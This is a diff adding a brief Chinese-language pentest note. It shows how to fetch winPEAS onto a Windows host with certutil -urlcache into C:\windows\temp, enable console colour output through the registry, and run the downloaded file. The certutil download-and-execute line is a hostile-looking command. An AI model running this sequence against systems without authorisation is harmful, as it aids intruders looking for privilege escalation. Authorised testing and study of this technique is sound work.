@@ -1,0 +1,10 @@
+项目地址:https://github.com/peass-ng/PEASS-ng
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+C:\windows\temp\$badfile
+
+###
+第一条命令为下载winpeas到C:\windows\temp目录下
+第二条命令为改注册表使得winpeas能够格式化输出
+第三条命令为运行winpeas
+###
